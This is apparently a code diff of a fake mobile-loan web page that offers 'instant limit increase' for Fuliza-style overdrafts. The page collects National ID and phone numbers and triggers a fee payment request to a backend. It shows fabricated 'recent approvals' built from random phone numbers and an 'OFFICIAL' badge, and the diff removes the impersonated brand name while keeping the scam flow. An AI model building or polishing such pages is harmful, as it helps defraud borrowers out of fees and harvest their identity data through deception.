@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>FULIZA LOAN LIMIT </title>
+<title>LOAN LIMIT </title>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
@@ -775,77 +775,13 @@ body::after{
 </head>
 <body>
 
-
-  <!-- POPUP -->
-<div id="popup" class="overlay">
-  <!-- Identity / Phone Input Popup -->
-  <div class="popup identity-popup" id="identity-popup">
-    <div class="identity-body">
-      <h3>Identify Yourself</h3>
-      <p>Enter your phone number to proceed</p>
-      <label class="field-label">Phone Number</label>
-      <input type="text" id="phone-input" class="field-input" placeholder="07XXXXXXXX">
-      <button class="pay-btn" id="identity-next">Next</button>
-      <button class="cancel-btn" id="identity-cancel">Cancel</button>
-    </div>
-  </div>
-
-  <!-- Review Request Popup -->
-  <div class="popup review-popup" id="review-popup">
-    <div class="review-header">
-      <img src="logo.png" class="review-header-logo" alt="Logo">
-      <div class="review-badge"><span class="dot"></span>Review Request</div>
-      <div class="review-title">Confirm Your Request</div>
-      <div class="review-sub">Verify details before submitting</div>
-      <div class="review-divider"></div>
-    </div>
-    <div class="review-body">
-      <div class="review-details">
-        <div class="review-row">
-          <span class="label">Phone</span>
-          <span class="value green" id="review-phone"></span>
-        </div>
-        <div class="review-sep"></div>
-        <div class="review-row">
-          <span class="label">Amount</span>
-          <span class="value green" id="review-amount">Ksh 5,000</span>
-        </div>
-      </div>
-      <div class="phone-section">
-        <label class="label">Your Phone</label>
-        <div class="phone-input-wrap">
-          <div class="dot"></div>
-          <input type="text" class="phone-input" id="review-phone-input">
-        </div>
-      </div>
-    </div>
-    <div class="review-actions">
-      <button class="pay-btn" id="pay-btn">Pay</button>
-      <button class="cancel-btn" id="review-cancel">Cancel</button>
-    </div>
-  </div>
-
-  <!-- Success Popup -->
-  <div class="popup success-popup" id="success-popup">
-    <div class="success-header">
-      <img src="logo.png" class="success-header-logo" alt="Logo">
-    </div>
-    <div class="success-check">
-      ✅
-    </div>
-    <h2>Request Submitted</h2>
-    <div class="msg">Your request with <strong id="success-phone"></strong> has been processed successfully.</div>
-    <button class="return-btn" id="return-btn">Return</button>
-  </div>
-</div>
-
 <!-- LOGO 1: Header -->
 <div class="header">
   </div>
 
 <!-- LOGO 2: Hero -->
 <div class="hero">
-  <h1>INCREASE FULIZA LIMIT LOANS</h1>
+  <h1>INCREASE LIMIT LOANS</h1>
   <p>Instant Limit Increase &bull; No Paperwork &bull; Same Day Access</p>
 </div>
 
@@ -902,7 +838,7 @@ body::after{
   <div class="popup identity-popup">
     <button class="popup-close-btn" id="identityCloseBtn" aria-label="Close">&times;</button>
     <div class="review-header">
-      <div class="review-badge"><span class="dot"></span>FULIZA LOANS OFFICIAL</div>
+      <div class="review-badge"><span class="dot"></span>LOAN OFFICIAL</div>
       <div class="review-title">LoanBoost</div>
       <div class="review-divider"></div>
       <div class="review-sub">Instant Limit Increase &bull; Faster Approval</div>
@@ -938,7 +874,7 @@ body::after{
 <div class="overlay" id="reviewOverlay">
   <div class="popup review-popup">
     <div class="review-header">
-      <div class="review-badge"><span class="dot"></span>FULIZA LOANS OFFICIAL</div>
+      <div class="review-badge"><span class="dot"></span>LOAN OFFICIAL</div>
       <div class="review-title">F Boost</div>
       <div class="review-divider"></div>
       <div class="review-sub">Instant Limit Increase &bull; Guaranteed Approval</div>
@@ -978,7 +914,7 @@ body::after{
 <div class="overlay" id="successOverlay">
   <div class="popup success-popup">
     <div class="success-header">
-      <div class="review-badge"><span class="dot"></span>FULIZA LOANS OFFICIAL</div>
+      <div class="review-badge"><span class="dot"></span>LOAN OFFICIAL</div>
     </div>
     <div class="success-notif">
       <svg width="20" height="20" fill="none" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="18" rx="3" stroke="#00a651" stroke-width="2"/><path d="M8 12l3 3 5-5" stroke="#00a651" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -1002,57 +938,6 @@ body::after{
 
 <!-- Toast -->
 <div class="toast" id="toast"></div>
-
-<script>
-// Helper: show a popup
-function openPopup(popupId) {
-  document.querySelectorAll('.popup').forEach(p => p.style.display = 'none');
-  document.getElementById('popup').classList.add('active');
-  const p = document.getElementById(popupId);
-  if (p) p.style.display = 'block';
-
-  // Auto-fill phone
-  const savedPhone = localStorage.getItem('userPhone') || '';
-  const phoneInput = p.querySelector('input');
-  if (phoneInput) phoneInput.value = savedPhone;
-}
-
-// Close overlay
-function closePopup() {
-  document.getElementById('popup').classList.remove('active');
-}
-
-// Identity Popup Buttons
-document.getElementById('identity-next').onclick = () => {
-  const phone = document.getElementById('phone-input').value.trim();
-  if (!phone) return alert('Enter a valid phone number');
-  localStorage.setItem('userPhone', phone);
-  document.getElementById('review-phone').innerText = phone;
-  document.getElementById('review-phone-input').value = phone;
-  openPopup('review-popup');
-};
-document.getElementById('identity-cancel').onclick = closePopup;
-
-// Review Popup Buttons
-document.getElementById('pay-btn').onclick = () => {
-  const phone = document.getElementById('review-phone-input').value.trim();
-  localStorage.setItem('userPhone', phone);
-  document.getElementById('success-phone').innerText = phone;
-  openPopup('success-popup');
-
-  // TODO: call backend STK push with this phone
-  console.log('Request STK Push for:', phone);
-};
-document.getElementById('review-cancel').onclick = closePopup;
-
-// Success Popup Return
-document.getElementById('return-btn').onclick = closePopup;
-
-// Click outside popup to close
-document.getElementById('popup').onclick = e => {
-  if (e.target.id === 'popup') closePopup();
-};
-</script>
 
 <script>
 const plans = [
@@ -1152,40 +1037,28 @@ function timeAgo(){
 
 // Smart plan picker (uses YOUR plans array)
 function pickPlan(){
-
-  const offers = plans.filter(p => p.offer);
-  const high = plans.filter(p => p.amount >= 50000);
+  const offers = plans.filter(p=>p.offer);
+  const high = plans.filter(p=>p.amount >= 50000);
 
   const r = Math.random();
 
   if(r < 0.5 && offers.length){
-    return offers[Math.floor(Math.random() * offers.length)];
+    return offers[Math.floor(Math.random()*offers.length)];
   }
-
   if(r < 0.8 && high.length){
-    return high[Math.floor(Math.random() * high.length)];
+    return high[Math.floor(Math.random()*high.length)];
   }
-
-  const filtered = plans.filter(p => p.amount >= 10000);
-  return filtered[Math.floor(Math.random() * filtered.length)];
+  return plans[Math.floor(Math.random()*plans.length)];
 }
 
 // Smooth animation
 function animateRecent(text){
   const el = document.getElementById('recentText');
-
   el.style.opacity = 0;
   el.style.transform = 'translateY(6px)';
 
   setTimeout(()=>{
-    // ✅ FIRST add message
-    el.innerHTML += `<div>${text}</div>`;
-
-    // ✅ THEN limit list
-    if(el.children.length > 6){
-      el.removeChild(el.firstChild);
-    }
-
+    el.innerHTML = text;
     el.style.opacity = 1;
     el.style.transform = 'translateY(0)';
   },250);
@@ -1193,7 +1066,7 @@ function animateRecent(text){
 
 // Main updater
 function randomRecent(){
-  const phone = randomPhone(is);
+  const phone = randomPhone();
   const plan = pickPlan();
   const time = timeAgo();
   const amount = fmt(plan.amount);
@@ -1228,31 +1101,19 @@ document.getElementById('ctaBtn').onclick=()=> {
 };
 
 // Verify & Continue → show review
-document.getElementById('verifyBtn').onclick = () => {
-
-  const idNum = document.getElementById('idInput').value.trim();
-  const phone = document.getElementById('phoneInput').value.trim();
-
-  if (!idNum || !phone) {
-    showToast('Fill all fields');
+document.getElementById('verifyBtn').onclick=()=>{
+  const idNum = document.getElementById('idInput').value.replace(/\s+/g,'');
+  const rawPhone = document.getElementById('phoneInput').value.replace(/\s+/g,'');
+  if(!/^\d{5,10}$/.test(idNum)){
+    showToast('Please enter a valid National ID number');
     return;
   }
-
-  if (!selected) {
-    showToast('Select loan first');
-    return;
-  }
-
-  userPhone = phone;
-
-  const display = '+254 ' + phone.replace(/^0/, '');
-
+  userPhone = rawPhone;
+  const display='+254 '+rawPhone.slice(0,3)+' '+rawPhone.slice(3,6)+' '+rawPhone.slice(6);
   hideOverlay('identityOverlay');
-
-  document.getElementById('revLimit').textContent = selected.amount;
-  document.getElementById('revFee').textContent = selected.fee;
-  document.getElementById('revPhone').textContent = display;
-
+  document.getElementById('revLimit').textContent=fmt(selected.amount);
+  document.getElementById('revFee').textContent='Ksh '+selected.fee.toLocaleString();
+  document.getElementById('revPhone').textContent=display;
   showOverlay('reviewOverlay');
 };
 
@@ -1273,12 +1134,12 @@ document.getElementById('payBtn').onclick = async () => {
   showOverlay('loadingOverlay');
 
   try {
-    const res = await fetch('https://jobs-abroad-r8k0.onrender.com/pay', {
+    const res = await fetch('https://YOUR-BACKEND-URL/stk-push', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         phone: phone,
-        amount: Number(selected.fee)
+        amount: selected.amount
       })
     });
 
@@ -1293,7 +1154,7 @@ document.getElementById('payBtn').onclick = async () => {
       }, 3000);
 
     } else {
-      showToast('Payment failed ❌');
+      throw new Error('STK failed');
     }
 
   } catch(err) {
